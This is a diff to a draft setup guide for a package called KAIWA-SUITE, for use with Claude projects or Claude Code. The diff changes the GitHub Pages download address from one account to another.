@@ -10,7 +10,7 @@ Status: draft, untested in Claude. This guide covers two ways: projects in claud
 
 ## Get the package
 
-Open the package page https://dpkrpsk-wq.github.io/KAIWA-SUITE/, choose the vendor "Claude" and press the download button. Unpack the ZIP file into a folder of your choice. All paths in this guide start in that folder.
+Open the package page https://mentalping-ops.github.io/KAIWA-SUITE/, choose the vendor "Claude" and press the download button. Unpack the ZIP file into a folder of your choice. All paths in this guide start in that folder.
 
 Which way fits you: way A needs only a browser and suits most users. Way B is for people who already use Claude Code, a program that runs Claude in a terminal on your own computer.
 
